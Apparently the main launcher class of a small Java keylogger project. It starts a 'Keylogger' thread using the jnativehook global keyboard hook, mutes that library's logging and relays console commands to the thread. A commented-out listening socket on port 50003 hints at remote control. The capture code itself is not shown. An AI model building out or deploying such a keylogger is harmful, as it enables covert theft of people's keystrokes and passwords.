package tk.arktech;

import org.jnativehook.GlobalScreen;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.CharBuffer;
import java.util.Scanner;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Main {


    public static void main(String[] args) {

//        ServerSocket svr = null;
//        try {
//            svr = new ServerSocket(50003);
//            Socket connection = svr.accept();
//            //TODO: zamkniecie polaczenia
//
//        } catch (IOException e) {
//            e.printStackTrace();
//        }


        BlockingQueue<String> test = new ArrayBlockingQueue<String>(10);
        BlockingQueue<String> commands = new ArrayBlockingQueue<String>(10);


        // Get the logger for "org.jnativehook" and set the level to off.
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

// Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);

         Thread thread = new Thread(new Keylogger(test, commands), "testowy");
         thread.start();

         Scanner sc = new Scanner(System.in);
         String data;
         System.out.println("Start");
         while(!(data = sc.next()).equals("terminate"))
         {
             System.out.print(">>");
             try {
                 commands.put(data);
                System.out.print(test.poll(1000, TimeUnit.MILLISECONDS));
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
         }
         System.out.println("end");
        try {
            thread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }


    }



}
